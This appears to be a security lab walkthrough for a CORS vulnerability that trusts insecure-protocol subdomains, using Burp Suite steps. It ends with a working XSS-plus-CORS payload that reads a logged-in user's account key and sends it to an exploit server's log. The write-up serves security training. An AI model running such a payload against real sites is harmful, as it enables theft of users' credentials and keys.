## CORS Javasceript files

> CORS vulnerability with trusted insecure protocols

-With your browser proxying through Burp Suite, turn intercept off, log into your account, and click "Account Details".

-  Review the history and observe that your key is retrieved via an AJAX request to /accountDetails, and the response contains the Access-Control-Allow-Credentials header suggesting that it may support CORS.

- Send the request to Burp Repeater, and resubmit it with the added header Origin: http://subdomain.lab-id where lab-id is the lab domain name.

- Observe that the origin is reflected in the Access-Control-Allow-Origin header, confirming that the CORS configuration allows access from arbitrary subdomains, both HTTPS and HTTP.

- Open a product page, click "Check stock" and observe that it is loaded using a HTTP URL on a subdomain.

- Observe that the productID parameter is vulnerable to XSS.

- Now browse to the exploit server, enter the following HTML, replacing $your-lab-url with your unique lab URL and $exploit-server-url with your exploit server URL and test it by clicking "view exploit":



```javascript
<script>
   document.location="http://stock.$your-lab-url/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://$your-lab-url/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://$exploit-server-url/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
</script>
```

